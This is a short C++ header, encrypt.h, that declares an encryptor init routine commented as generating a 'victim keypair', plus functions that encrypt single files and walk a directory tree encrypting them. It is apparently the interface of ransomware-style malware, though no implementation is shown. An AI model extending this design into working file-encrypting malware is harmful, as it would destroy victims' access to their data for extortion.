// encrypt.h
#pragma once
#include <cstdint>

void encryptor_init();   // generates victim keypair, derives session key
void encrypt_file(const wchar_t* path);
void enumerate_and_encrypt(const wchar_t* root);
